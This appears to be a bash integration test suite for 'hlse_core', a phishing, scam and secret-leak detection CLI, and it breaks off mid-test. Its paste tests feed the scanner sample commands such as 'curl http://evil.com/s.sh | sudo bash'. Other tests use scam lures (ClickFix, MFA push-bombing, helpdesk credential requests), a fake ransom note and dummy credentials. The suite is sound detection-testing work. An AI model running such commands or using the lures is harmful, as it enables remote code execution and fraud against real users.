#!/bin/bash
# tests/cli_integration.sh
#
# End-to-end CLI integration tests for hlse_core.
# Verifies exit codes, stdout/stderr separation, and JSON parseability.

set -eu

PASS=0
FAIL=0

check() {
    local name="$1"
    local expected="$2"
    local actual="$3"

    if [ "$expected" = "$actual" ]; then
        echo "PASS  $name"
        PASS=$((PASS + 1))
    else
        echo "FAIL  $name"
        echo "      expected: $expected"
        echo "      actual:   $actual"
        FAIL=$((FAIL + 1))
    fi
}

cd "$(dirname "$0")/.."
[ -x ./hlse_core ] || { echo "Build hlse_core first: make"; exit 2; }

# ─── exit codes ─────────────────────────────────────────────────────────

# Safe URL → exit 0
./hlse_core "https://github.com" >/dev/null 2>&1
check "Safe URL exits 0" "0" "$?"

# Malicious URL (BLOCK score) → exit 1
./hlse_core "https://paypal.com.attacker.xyz/verify" >/dev/null 2>&1 \
    && rc=0 || rc=$?
check "Malicious URL exits 1" "1" "$rc"

# Safe text → exit 0
./hlse_core text "Meeting tomorrow" >/dev/null 2>&1
check "Safe text exits 0" "0" "$?"

# Scam text (BLOCK) → exit 1
./hlse_core text "Microsoft Support: your PC has a virus, send gift cards now URGENT" \
    >/dev/null 2>&1 && rc=0 || rc=$?
# Allow either 0 or 1 since score might be ALERT (0) or BLOCK (1)
case "$rc" in
    0|1) PASS=$((PASS + 1)); echo "PASS  Scam text exit code valid ($rc)" ;;
    *)   FAIL=$((FAIL + 1)); echo "FAIL  Scam text bad exit code ($rc)" ;;
esac

# Help flag
./hlse_core --help >/dev/null 2>/tmp/hlse_help_err
[ -s /tmp/hlse_help_err ] && PASS=$((PASS + 1)) \
    && echo "PASS  --help writes to stderr" \
    || { FAIL=$((FAIL + 1)); echo "FAIL  --help should write to stderr"; }

# ─── JSON output ────────────────────────────────────────────────────────

# JSON parseability via Python
JSON_OUT=$(./hlse_core --json "https://g00gle.com")
echo "$JSON_OUT" | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "url"
assert data["score"] >= 40
assert "reasons" in data and len(data["reasons"]) > 0
' && check "JSON URL output parseable" "0" "0" \
   || check "JSON URL output parseable" "0" "1"

JSON_OUT=$(./hlse_core --json text "URGENT wire 5000")
echo "$JSON_OUT" | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "text"
assert data["score"] >= 30
' && check "JSON text output parseable" "0" "0" \
   || check "JSON text output parseable" "0" "1"

# ─── stdin pipe ─────────────────────────────────────────────────────────

# Mixed stdin input
STDIN_OUT=$(printf '%s\n' "https://g00gle.com" "https://github.com" \
            "URGENT wire money" "Meeting tomorrow" \
            | ./hlse_core --stdin)

echo "$STDIN_OUT" | grep -q "ALERT.*g00gle" \
    && check "stdin: detects malicious URL" "0" "0" \
    || check "stdin: detects malicious URL" "0" "1"

echo "$STDIN_OUT" | grep -q "OK.*github" \
    && check "stdin: passes legit URL" "0" "0" \
    || check "stdin: passes legit URL" "0" "1"

# stdin text output carries the attack-pattern label (parity with --json).
printf '%s\n' "https://discordd.com/login" | ./hlse_core --stdin 2>&1 \
    | grep -qi "Pattern:.*typosquat" \
    && check "stdin: text output includes Pattern label" "0" "0" \
    || check "stdin: text output includes Pattern label" "0" "1"

# stdin pipe mode honours --fail-on (was hardcoded at BLOCK/60).
rc=0; printf '%s\n' "https://bit.ly/abc123" | ./hlse_core --stdin --fail-on log >/dev/null 2>&1 || rc=$?
check "stdin: --fail-on log fails a LOG finding → exit 1" "1" "$rc"
# Default gate (60) spares the same LOG finding in stdin mode → exit 0.
rc=0; printf '%s\n' "https://bit.ly/abc123" | ./hlse_core --stdin >/dev/null 2>&1 || rc=$?
check "stdin: default gate spares a LOG finding → exit 0" "0" "$rc"

# ─── self-test integration ──────────────────────────────────────────────

./hlse_core --self-test 2>&1 | grep -qE "[0-9]+ passed, 0 failed" \
    && check "self-test URL all pass" "0" "0" \
    || check "self-test URL all pass" "0" "1"

./hlse_core --self-test 2>&1 | grep -qE "Text tests: [0-9]+ passed, 0 failed" \
    && check "self-test text all pass" "0" "0" \
    || check "self-test text all pass" "0" "1"

# ─── benchmark integration ──────────────────────────────────────────────

./hlse_core --benchmark 2>&1 | grep -q "F1:        1.000" \
    && check "benchmark F1=1.000" "0" "0" \
    || check "benchmark F1=1.000" "0" "1"

# ─── Apple-style features ──────────────────────────────────────────────

# No-arg demo: should print live demo and exit 0
./hlse_core 2>&1 | grep -q "phishing & scam detection" \
    && check "no-arg demo shows product intro" "0" "0" \
    || check "no-arg demo shows product intro" "0" "1"

# --version
./hlse_core --version 2>&1 | grep -qE "hlse_core [0-9]+\.[0-9]+\.[0-9]+" \
    && check "--version shows semver" "0" "0" \
    || check "--version shows semver" "0" "1"

# Empty string → error (not OK)
./hlse_core "" 2>&1 | grep -q "Nothing to scan" \
    && check "empty input → meaningful error" "0" "0" \
    || check "empty input → meaningful error" "0" "1"

# Unified scan: text without 'text' subcommand
./hlse_core "URGENT wire 5000 immediately gift card" 2>&1 | grep -qE "ALERT|BLOCK|LOG|ISOLATE" \
    && check "auto-detect text (no 'text' subcommand needed)" "0" "0" \
    || check "auto-detect text (no 'text' subcommand needed)" "0" "1"

# ─── protect subcommand ─────────────────────────────────────────────

# protect on /tmp (clean) → should exit 0
./hlse_core protect /tmp >/dev/null 2>&1
check "protect /tmp exits 0 (clean)" "0" "$?"

# protect with ransom note
PROT_DIR=$(mktemp -d)
echo "Your files encrypted" > "$PROT_DIR/HOW_TO_DECRYPT.txt"
./hlse_core protect "$PROT_DIR" 2>&1 | grep -qE "R3|Ransom" \
    && check "protect detects ransom note" "0" "0" \
    || check "protect detects ransom note" "0" "1"

# JSON protect output
JSON_PROT=$(./hlse_core --json protect "$PROT_DIR" 2>&1)
echo "$JSON_PROT" | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "protect"
assert data["score"] >= 30
assert "reasons" in data
' && check "--json protect parseable" "0" "0" \
   || check "--json protect parseable" "0" "1"

rm -rf "$PROT_DIR"

# ─── esp subcommand (UEFI/ESP integrity) ────────────────────────────

# Clean ESP (benign .efi, no ransom text) → exit 0
ESP_DIR=$(mktemp -d)
mkdir -p "$ESP_DIR/EFI/BOOT"
head -c 4096 /dev/urandom > "$ESP_DIR/EFI/BOOT/BOOTX64.EFI"
./hlse_core esp "$ESP_DIR" >/dev/null 2>&1
check "esp: clean ESP exits 0" "0" "$?"

# Malicious .efi carrying a ransom-note phrase → BLOCK (exit 1)
printf 'MZ payload all your files have been encrypted pay bitcoin' \
    > "$ESP_DIR/EFI/BOOT/evil.efi"
./hlse_core esp "$ESP_DIR" 2>&1 | grep -qE "E3|encrypted" \
    && check "esp: detects ransom string in .efi" "0" "0" \
    || check "esp: detects ransom string in .efi" "0" "1"
./hlse_core esp "$ESP_DIR" >/dev/null 2>&1 && rc=0 || rc=$?
check "esp: malicious ESP exits 1" "1" "$rc"

# Non-.efi file with the same text must NOT be scanned (extension filter)
ESP_DIR2=$(mktemp -d); mkdir -p "$ESP_DIR2/EFI"
printf 'all your files have been encrypted pay bitcoin' > "$ESP_DIR2/EFI/notes.txt"
./hlse_core esp "$ESP_DIR2" >/dev/null 2>&1
check "esp: ignores non-.efi files" "0" "$?"

# Missing ESP path → graceful exit 0
./hlse_core esp "$ESP_DIR/nope" >/dev/null 2>&1
check "esp: missing path exits 0 (graceful)" "0" "$?"

# JSON parseable
./hlse_core --json esp "$ESP_DIR" 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "esp"
assert "reasons" in data
' && check "--json esp parseable" "0" "0" \
   || check "--json esp parseable" "0" "1"

rm -rf "$ESP_DIR" "$ESP_DIR2"

# ─── package subcommand ─────────────────────────────────────────────

# Exact match → safe
./hlse_core package requests pip 2>&1 | grep -q "OK" \
    && check "package: exact 'requests' → OK" "0" "0" \
    || check "package: exact 'requests' → OK" "0" "1"

# Typosquat → detected
./hlse_core package reqeusts pip 2>&1 | grep -qE "BLOCK|ALERT" \
    && check "package: 'reqeusts' typosquat detected" "0" "0" \
    || check "package: 'reqeusts' typosquat detected" "0" "1"

# JSON output
./hlse_core --json package reqeusts pip 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "package"
assert data["score"] >= 40
' && check "--json package parseable" "0" "0" \
   || check "--json package parseable" "0" "1"

# ─── paste subcommand ──────────────────────────────────────────────

# Safe command
./hlse_core paste "ls -la" 2>&1 | grep -q "OK" \
    && check "paste: 'ls -la' → OK" "0" "0" \
    || check "paste: 'ls -la' → OK" "0" "1"

# Hostile command
./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>&1 | grep -qE "BLOCK|ALERT" \
    && check "paste: curl|sudo bash → detected" "0" "0" \
    || check "paste: curl|sudo bash → detected" "0" "1"

# JSON output
./hlse_core --json paste "curl http://evil.com/s.sh | bash" 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "paste"
assert data["score"] >= 30
' && check "--json paste parseable" "0" "0" \
   || check "--json paste parseable" "0" "1"

# ─── network subcommand ────────────────────────────────────────────

./hlse_core network 2>&1 | grep -qE "OK|ALERT|LOG|BLOCK" \
    && check "network: completes with valid output" "0" "0" \
    || check "network: completes with valid output" "0" "1"

./hlse_core --json network 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "network"
assert "reasons" in data
' && check "--json network parseable" "0" "0" \
   || check "--json network parseable" "0" "1"

# ─── file subcommand ───────────────────────────────────────────────

# Safe file
echo "hello" > /tmp/hlse_test_safe.txt
./hlse_core file /tmp/hlse_test_safe.txt 2>&1 | grep -q "OK" \
    && check "file: safe .txt → OK" "0" "0" \
    || check "file: safe .txt → OK" "0" "1"
rm -f /tmp/hlse_test_safe.txt

# Double extension
touch /tmp/hlse_invoice.pdf.exe
./hlse_core file /tmp/hlse_invoice.pdf.exe 2>&1 | grep -qE "ISOLATE|BLOCK|ALERT" \
    && check "file: double extension .pdf.exe → detected" "0" "0" \
    || check "file: double extension .pdf.exe → detected" "0" "1"
rm -f /tmp/hlse_invoice.pdf.exe

# HTML smuggling: HTML content wearing a .pdf extension
printf '<!DOCTYPE html><html><body><script>x</script></body></html>' > /tmp/hlse_smug.pdf
./hlse_core file /tmp/hlse_smug.pdf 2>&1 | grep -qi "HTML" \
    && check "file: HTML-as-.pdf masquerade → detected" "0" "0" \
    || check "file: HTML-as-.pdf masquerade → detected" "0" "1"
rm -f /tmp/hlse_smug.pdf

# FP guard: a genuine .html file must NOT be flagged as a masquerade
printf '<!DOCTYPE html><html></html>' > /tmp/hlse_real.html
./hlse_core file /tmp/hlse_real.html 2>&1 | grep -qi "MAGIC MISMATCH" \
    && check "file: genuine .html NOT flagged as masquerade" "0" "1" \
    || check "file: genuine .html NOT flagged as masquerade" "0" "0"
rm -f /tmp/hlse_real.html

# ─── audit subcommand ──────────────────────────────────────────────

./hlse_core audit 2>&1 | grep -qE "OK|ALERT|LOG|BLOCK|HIGH|MED|LOW" \
    && check "audit: completes with valid output" "0" "0" \
    || check "audit: completes with valid output" "0" "1"

./hlse_core --json audit 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "audit"
assert "findings" in data
hi = data["hardening_index"]
assert 0 <= hi <= 100
assert hi == 100 - min(data["score"], 100)
assert data["hardening_band"] in ("hardened", "good", "fair", "weak")
' && check "--json audit has hardening_index" "0" "0" \
   || check "--json audit has hardening_index" "0" "1"

# Human-readable output shows the hardening index
./hlse_core audit 2>&1 | grep -q "Hardening index:" \
    && check "audit: prints hardening index" "0" "0" \
    || check "audit: prints hardening index" "0" "1"

# ─── compound detection ────────────────────────────────────────────

# Embedded phishing URL in urgency text → compound score
./hlse_core "URGENT: click https://g00gle.com/signin now" 2>&1 | grep -qE "BLOCK|ISOLATE" \
    && check "embedded phishing URL + urgency → compound BLOCK+" "0" "0" \
    || check "embedded phishing URL + urgency → compound BLOCK+" "0" "1"

# ClickFix fake-CAPTCHA paste-and-run → BLOCK/ISOLATE
./hlse_core "To verify you are human, press Windows + R, then paste this command and hit Enter" 2>&1 | grep -qE "BLOCK|ISOLATE" \
    && check "ClickFix fake-CAPTCHA paste-and-run → BLOCK+" "0" "0" \
    || check "ClickFix fake-CAPTCHA paste-and-run → BLOCK+" "0" "1"

# ClickFix legit IT instruction (Win+R + type cmd, no paste-execute) → not flagged
./hlse_core "Press Windows + R to open the Run dialog, then type cmd to launch the command prompt." 2>&1 | grep -qE "^OK|^LOG" \
    && check "ClickFix FP guard: legit Win+R IT instruction stays low" "0" "0" \
    || check "ClickFix FP guard: legit Win+R IT instruction stays low" "0" "1"

# Toll-road smishing (E-ZPass + urgency + payment) → ALERT/BLOCK
./hlse_core "E-ZPass: your account has an outstanding toll balance. Settle immediately to avoid penalties." 2>&1 | grep -qE "ALERT|BLOCK|ISOLATE" \
    && check "toll smishing (E-ZPass outstanding balance) → ALERT+" "0" "0" \
    || check "toll smishing (E-ZPass outstanding balance) → ALERT+" "0" "1"

# Toll FP guard: legit E-ZPass account mention without scam signature → low
./hlse_core "Thank you for using E-ZPass. Your account balance is updated after your last trip." 2>&1 | grep -qE "^OK|^LOG" \
    && check "toll FP guard: legit E-ZPass mention stays low" "0" "0" \
    || check "toll FP guard: legit E-ZPass mention stays low" "0" "1"

# MFA push-bombing: "just approve the notification" → ALERT+
./hlse_core "I keep getting login requests, just approve the notification on your phone to stop them" 2>&1 | grep -qE "ALERT|BLOCK|ISOLATE" \
    && check "MFA fatigue: approve-notification push-bombing → ALERT+" "0" "0" \
    || check "MFA fatigue: approve-notification push-bombing → ALERT+" "0" "1"

# IT-helpdesk impersonation + password request → ALERT+
./hlse_core "This is your IT helpdesk. We need your username and current password to reset your AD account." 2>&1 | grep -qE "ALERT|BLOCK|ISOLATE" \
    && check "IT helpdesk impersonation + credential harvest → ALERT+" "0" "0" \
    || check "IT helpdesk impersonation + credential harvest → ALERT+" "0" "1"

# ─── scan subcommand ────────────────────────────────────────────

# Scan clean directory
SCAN_DIR=$(mktemp -d)
echo "safe content" > "$SCAN_DIR/readme.txt"
./hlse_core scan "$SCAN_DIR" 2>&1 | grep -q "0 threats" \
    && check "scan: clean dir → 0 threats" "0" "0" \
    || check "scan: clean dir → 0 threats" "0" "1"

# Scan with secret
echo "AKIAIOSFODNN7EXAMPLE" > "$SCAN_DIR/config.env"
./hlse_core scan "$SCAN_DIR" 2>&1 | grep -qE "AWS|threat" \
    && check "scan: detects leaked AWS key" "0" "0" \
    || check "scan: detects leaked AWS key" "0" "1"

# Scan a >1MB file (log/dump) — secret in the first part must be found,
# not skipped by an over-tight size cap.
BIG_DIR=$(mktemp -d)
{ printf 'aws_secret_access_key = wJalrXUtnFEMItesting7bPxRfiCYzABCD1234567\n'
  for i in $(seq 1 40000); do printf 'log line %d padding padding padding padding\n' "$i"; done; } > "$BIG_DIR/app.log"
./hlse_core scan "$BIG_DIR" 2>&1 | grep -qiE "AWS secret|threat" \
    && check "scan: secret in >1MB file → detected (not size-skipped)" "0" "0" \
    || check "scan: secret in >1MB file → detected (not size-skipped)" "0" "1"
rm -rf "$BIG_DIR"

# blast radius: credentials across multiple asset classes → pivot warning
BR_DIR=$(mktemp -d)
printf 'DATABASE_URL=postgres://admin:Sup3rSecretPass1@db.prod.com/main\n' > "$BR_DIR/.env"
printf 'token=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij\n' > "$BR_DIR/ci.txt"
./hlse_core scan "$BR_DIR" 2>&1 | grep -qi "BLAST RADIUS" \
    && check "scan: multi-asset-class repo → blast radius warning" "0" "0" \
    || check "scan: multi-asset-class repo → blast radius warning" "0" "1"
# JSON exposes asset_classes count
./hlse_core --json scan "$BR_DIR" 2>&1 | grep scan_summary | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["asset_classes"] >= 2
' && check "scan: JSON summary has asset_classes >= 2" "0" "0" \
   || check "scan: JSON summary has asset_classes >= 2" "0" "1"
rm -rf "$BR_DIR"

# blast radius: a single asset class must NOT trigger the pivot warning
SR_DIR=$(mktemp -d)
printf 'aws_secret_access_key = wJalrXUtnFEMItesting7bPxRfiCYzABCD1234567\n' > "$SR_DIR/.env"
./hlse_core scan "$SR_DIR" 2>&1 | grep -qi "BLAST RADIUS" \
    && check "scan: single asset class → no blast radius" "0" "1" \
    || check "scan: single asset class → no blast radius" "0" "0"
rm -rf "$SR_DIR"

# Scan MUST inspect dotfiles — .env is the #1 secret-leak file
DOT_DIR=$(mktemp -d)
printf 'DATABASE_URL=postgres://admin:Sup3rS3cr3tPass@db.prod.com/main\n' > "$DOT_DIR/.env"
./hlse_core scan "$DOT_DIR" 2>&1 | grep -qiE "threat|credential|secret" \
    && check "scan: inspects .env dotfile (not skipped)" "0" "0" \
    || check "scan: inspects .env dotfile (not skipped)" "0" "1"
# …but a .git/ directory must still be skipped (large, binary, no secrets)
mkdir -p "$DOT_DIR/.git"
printf 'aws_access_key_id = AKIA2E3MWORQXYZ4567PQ\n' > "$DOT_DIR/.git/objects.txt"
./hlse_core scan "$DOT_DIR" 2>&1 | grep -q "\.git/objects" \
    && check "scan: .git directory still skipped" "0" "1" \
    || check "scan: .git directory still skipped" "0" "0"
rm -rf "$DOT_DIR"

# Symlink-escape: a symlink in the tree pointing OUTSIDE must NOT be
# followed/read (SPECIFICATION.md §1 — never follow symlinks).
SYM_ROOT=$(mktemp -d); SYM_OUT=$(mktemp -d)
printf 'aws_access_key_id = AKIA2E3MWORQXYZ4567PQ\n' > "$SYM_OUT/secret.env"
ln -s "$SYM_OUT/secret.env" "$SYM_ROOT/leak.env"   # symlink file → outside
ln -s "$SYM_OUT" "$SYM_ROOT/leakdir"               # symlink dir  → outside
echo "harmless" > "$SYM_ROOT/ok.txt"
./hlse_core scan "$SYM_ROOT" 2>&1 | grep -q "0 threats" \
    && check "scan: does not follow symlinks (no scope escape)" "0" "0" \
    || check "scan: does not follow symlinks (no scope escape)" "0" "1"
rm -rf "$SYM_ROOT" "$SYM_OUT"

# Scan with double extension
touch "$SCAN_DIR/invoice.pdf.exe"
./hlse_core --json scan "$SCAN_DIR" 2>&1 | python3 -c '
import sys, json
lines = [l.strip() for l in sys.stdin if l.strip()]
assert len(lines) >= 1, "no output"
# All lines must be valid JSON
for l in lines:
    json.loads(l)
# Last line must be scan_summary
summary = json.loads(lines[-1])
assert summary["kind"] == "scan_summary", f"last line is {summary['kind']}"
assert "files_scanned" in summary
assert "threats" in summary
assert "target" in summary, "scan_summary missing target field"
' && check "--json scan with summary line" "0" "0" \
   || check "--json scan with summary line" "0" "1"

# Scan detects phishing URLs in files
echo 'Visit https://g00gle.com/signin now' > "$SCAN_DIR/phish.md"
./hlse_core scan "$SCAN_DIR" 2>&1 | grep -qE "g00gle|BLOCK|ALERT" \
    && check "scan: detects phishing URL in file" "0" "0" \
    || check "scan: detects phishing URL in file" "0" "1"

rm -rf "$SCAN_DIR"

# ─── quiet mode ────────────────────────────────────────────────

# Quiet: no output, exit 0 for safe
OUT=$(./hlse_core -q "https://github.com" 2>&1)
RC=$?
[ -z "$OUT" ] && [ "$RC" = "0" ] \
    && check "quiet: safe URL → no output, exit 0" "0" "0" \
    || check "quiet: safe URL → no output, exit 0" "0" "1"

# Quiet: no output, exit 1 for threat
OUT=$(./hlse_core -q "https://paypal.com.attacker.xyz/verify" 2>&1 || true)
RC_QUIET=$?
# When || true catches it, $? is 0 — need to test differently
./hlse_core -q "https://paypal.com.attacker.xyz/verify" > /tmp/hlse_q_out 2>&1 || RC_QUIET=$?
Q_OUTPUT=$(cat /tmp/hlse_q_out 2>/dev/null)
rm -f /tmp/hlse_q_out
[ -z "$Q_OUTPUT" ] \
    && check "quiet: threat URL → no output, exit non-zero" "0" "0" \
    || check "quiet: threat URL → no output, exit non-zero" "0" "1"

# ─── scan skip + embedded URL ───────────────────────────────────────

# Scan skips node_modules by default
SKIP_DIR=$(mktemp -d)
mkdir -p "$SKIP_DIR/node_modules/pkg"
echo "AKIAIOSFODNN7EXAMPLE" > "$SKIP_DIR/node_modules/pkg/key.js"
echo "safe content" > "$SKIP_DIR/app.js"
./hlse_core scan "$SKIP_DIR" 2>&1 | grep -q "0 threats" \
    && check "scan: skips node_modules" "0" "0" \
    || check "scan: skips node_modules" "0" "1"
rm -rf "$SKIP_DIR"

# Scan nonexistent directory → error exit 2
./hlse_core scan /tmp/hlse_does_not_exist_dir 2>&1 | grep -q "Error" \
    && check "scan: nonexistent dir → error message" "0" "0" \
    || check "scan: nonexistent dir → error message" "0" "1"

./hlse_core scan /tmp/hlse_does_not_exist_dir > /dev/null 2>&1 || rc=$?
[ "${rc:-0}" -eq 2 ] \
    && check "scan: nonexistent dir → exit 2" "0" "0" \
    || check "scan: nonexistent dir → exit 2" "0" "1"

# Text with embedded phishing URL
./hlse_core text "Click here: https://g00gle.com/signin" 2>&1 | grep -qE "ALERT|BLOCK|ISOLATE" \
    && check "text: embedded phishing URL detected" "0" "0" \
    || check "text: embedded phishing URL detected" "0" "1"

# --json text with embedded phishing URL must NOT return score=0
# (regression guard for the bug where JSON path skipped URL extraction)
rc=0; json=$(./hlse_core --json text "click https://paypa1.com/signin" 2>/dev/null) || rc=$?
echo "$json" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if d['score']>=15 else 1)" 2>/dev/null \
    && check "--json text: embedded URL score included in JSON" "0" "0" \
    || check "--json text: embedded URL score included in JSON" "0" "1"

# ─── error handling for nonexistent paths ──────────────────────────

./hlse_core scan /tmp/hlse_nonexistent_$$ 2>&1 | grep -q "cannot access" \
    && check "scan: nonexistent path → error message" "0" "0" \
    || check "scan: nonexistent path → error message" "0" "1"

./hlse_core protect /tmp/hlse_nonexistent_$$ 2>&1 | grep -q "cannot access" \
    && check "protect: nonexistent path → error message" "0" "0" \
    || check "protect: nonexistent path → error message" "0" "1"

# A nonexistent path is now analyzed by NAME (catches RLO/double-ext on
# files not present locally). A plain .txt name should come back clean.
./hlse_core file /tmp/hlse_nonexistent_$$.txt >/dev/null 2>&1 \
    && check "file: nonexistent plain name → clean (name analysis)" "0" "0" \
    || check "file: nonexistent plain name → clean (name analysis)" "0" "1"

# A nonexistent RLO-disguised name must still be flagged by name analysis.
RLO_NAME=$(printf 'invoice\342\200\256cod.exe')
./hlse_core file "$RLO_NAME" 2>&1 | grep -qE "OVERRIDE|ISOLATE|BLOCK" \
    && check "file: RLO name flagged even when file absent" "0" "0" \
    || check "file: RLO name flagged even when file absent" "0" "1"

# ─── URL evasion resistance ────────────────────────────────────────

# URL-encoded path: %76%65%72%69%66%79 = /verify
./hlse_core "https://g00gle.com/%76%65%72%69%66%79" 2>&1 | grep -q "verify" \
    && check "URL: percent-encoded path decoded (%76%65.. → verify)" "0" "0" \
    || check "URL: percent-encoded path decoded" "0" "1"

# IP-based phishing: brand in path of IP URL
./hlse_core "https://198.51.100.1/paypal/signin" 2>&1 | grep -qE "ALERT|BLOCK|IP-based" \
    && check "URL: IP host + brand in path → detected" "0" "0" \
    || check "URL: IP host + brand in path → detected" "0" "1"

# Obfuscated dotless IP host: hex-encoded (0x7f000001 = 127.0.0.1)
./hlse_core "http://0x7f000001/admin" 2>&1 | grep -qi "Obfuscated IP" \
    && check "URL: hex-encoded IP host → flagged as obfuscation" "0" "0" \
    || check "URL: hex-encoded IP host → flagged as obfuscation" "0" "1"

# Obfuscated dotless IP host: dword-decimal (2130706433 = 127.0.0.1)
./hlse_core "http://2130706433/login" 2>&1 | grep -qi "Obfuscated IP" \
    && check "URL: dword-decimal IP host → flagged as obfuscation" "0" "0" \
    || check "URL: dword-decimal IP host → flagged as obfuscation" "0" "1"

# FP guard: a hostname with a hyphen and digits is NOT an obfuscated IP
./hlse_core "https://www.7-eleven.com" 2>&1 | grep -qi "Obfuscated IP" \
    && check "URL: 7-eleven.com NOT flagged as obfuscated IP" "0" "1" \
    || check "URL: 7-eleven.com NOT flagged as obfuscated IP" "0" "0"

# @ credential trick must fire only for '@' in the AUTHORITY
./hlse_core "https://www.paypal.com@evil.ru/login" 2>&1 | grep -qi "credential trick" \
    && check "URL: @ in authority → credential trick flagged" "0" "0" \
    || check "URL: @ in authority → credential trick flagged" "0" "1"

# FP guard: an '@' in the query string (email param) is NOT a credential trick
./hlse_core "https://example.com/contact?email=user@gmail.com" 2>&1 | grep -qi "credential trick" \
    && check "URL: @ in query (email) NOT flagged as credential trick" "0" "1" \
    || check "URL: @ in query (email) NOT flagged as credential trick" "0" "0"

# ─── SARIF 2.1.0 output ─────────────────────────────────────────────

# SARIF output is valid JSON with version 2.1.0
SARIF_DIR=$(mktemp -d)
echo "key = AKIA2E3MWORQXYZ4567PQ" > "$SARIF_DIR/secrets.env"
touch "$SARIF_DIR/invoice.pdf.exe"
./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | grep -q '"version": "2.1.0"' \
    && check "SARIF: emits version 2.1.0" "0" "0" \
    || check "SARIF: emits version 2.1.0" "0" "1"

./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | grep -q '"name": "HLSE"' \
    && check "SARIF: tool driver name HLSE" "0" "0" \
    || check "SARIF: tool driver name HLSE" "0" "1"

./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | grep -q '"ruleId": "secret"' \
    && check "SARIF: secret result present" "0" "0" \
    || check "SARIF: secret result present" "0" "1"

./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | grep -q '"security-severity"' \
    && check "SARIF: security-severity property present" "0" "0" \
    || check "SARIF: security-severity property present" "0" "1"

# SARIF parses as valid JSON via python (if available)
if command -v python3 >/dev/null 2>&1; then
    ./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | \
        python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null \
        && check "SARIF: valid parseable JSON" "0" "0" \
        || check "SARIF: valid parseable JSON" "0" "1"

    # SARIF URIs must be relative (no leading /) for GitHub code scanning
    ./hlse_core --sarif scan "$SARIF_DIR" 2>/dev/null | python3 -c "
import sys, json
d = json.load(sys.stdin)
uris = [loc['physicalLocation']['artifactLocation']['uri']
        for run in d['runs']
        for result in run['results']
        for loc in result.get('locations', [])]
assert uris, 'no results'
assert all(not u.startswith('/') for u in uris), 'absolute URI found: ' + str(uris)
" 2>/dev/null \
        && check "SARIF: artifactLocation URIs are relative" "0" "0" \
        || check "SARIF: artifactLocation URIs are relative" "0" "1"
fi
rm -rf "$SARIF_DIR"

# ─── blind-spot disclosure on clean verdicts ────────────────────────
# A clean URL discloses what HLSE cannot see (structural check only).
./hlse_core "https://www.google.com" 2>&1 | grep -qi "Blind spot" \
    && check "blindspot: clean URL discloses limits" "0" "0" \
    || check "blindspot: clean URL discloses limits" "0" "1"
# A threat verdict must NOT carry the clean-result blind-spot note.
./hlse_core "https://paypal-verify.ru/login" 2>&1 | grep -qi "Blind spot" \
    && check "blindspot: threat verdict has no blind-spot note" "0" "1" \
    || check "blindspot: threat verdict has no blind-spot note" "0" "0"
# Clean text discloses its keyword/structure limitation.
./hlse_core text "are we still on for lunch tomorrow" 2>&1 | grep -qi "Blind spot" \
    && check "blindspot: clean text discloses limits" "0" "0" \
    || check "blindspot: clean text discloses limits" "0" "1"

# ─── exoneration on heuristic (LOG/ALERT) threats ───────────────────
# A heuristic-band URL offers the benign explanation + falsifying test.
./hlse_core "https://secure-account-login-verify-update-now.com" 2>&1 | grep -qi "Could be benign" \
    && check "exoneration: heuristic URL offers benign read" "0" "0" \
    || check "exoneration: heuristic URL offers benign read" "0" "1"
# A high-confidence BLOCK/ISOLATE threat must NOT be hedged.
./hlse_core "https://paypal-verify.ru/login" 2>&1 | grep -qi "Could be benign" \
    && check "exoneration: high-confidence threat is not hedged" "0" "1" \
    || check "exoneration: high-confidence threat is not hedged" "0" "0"
# A clean result must NOT carry the threat-exoneration note.
./hlse_core "https://www.google.com" 2>&1 | grep -qi "Could be benign" \
    && check "exoneration: clean result has no benign-threat note" "0" "1" \
    || check "exoneration: clean result has no benign-threat note" "0" "0"

# ─── --fail-on configurable exit gate ───────────────────────────────
# A BLOCK(70) URL: default gate (block/60) → exit 1.
rc=0; ./hlse_core -q "https://paypal-verify.ru/login" >/dev/null 2>&1 || rc=$?
check "fail-on: BLOCK url default gate → exit 1" "1" "$rc"
# Raise the gate to isolate(80): the BLOCK(70) URL no longer fails → exit 0.
rc=0; ./hlse_core -q --fail-on isolate "https://paypal-verify.ru/login" >/dev/null 2>&1 || rc=$?
check "fail-on: --fail-on isolate spares a BLOCK url → exit 0" "0" "$rc"
# Lower the gate to log(15): the BLOCK url still fails → exit 1.
rc=0; ./hlse_core -q --fail-on log "https://paypal-verify.ru/login" >/dev/null 2>&1 || rc=$?
check "fail-on: --fail-on log fails a BLOCK url → exit 1" "1" "$rc"
# An invalid tier is a usage error → exit 2.
rc=0; ./hlse_core --fail-on bogus "x" >/dev/null 2>&1 || rc=$?
check "fail-on: invalid tier → exit 2" "2" "$rc"
# scan honours the gate: an ALERT-tier finding fails only at --fail-on alert.
FO_DIR=$(mktemp -d)
printf '<!DOCTYPE html><html><script>x</script></html>' > "$FO_DIR/invoice.pdf"
rc=0; ./hlse_core -q scan "$FO_DIR" >/dev/null 2>&1 || rc=$?
check "fail-on: scan default gate spares an ALERT finding → exit 0" "0" "$rc"
rc=0; ./hlse_core -q --fail-on alert scan "$FO_DIR" >/dev/null 2>&1 || rc=$?
check "fail-on: scan --fail-on alert catches it → exit 1" "1" "$rc"
rm -rf "$FO_DIR"

# ─── Canonical domain (contrastive truth) ───────────────────────────
# Typosquat: the canonical domain of the impersonated brand is shown.
./hlse_core "https://discordd.com/login" 2>&1 | grep -qi "Legitimate 'discord': discord.com" \
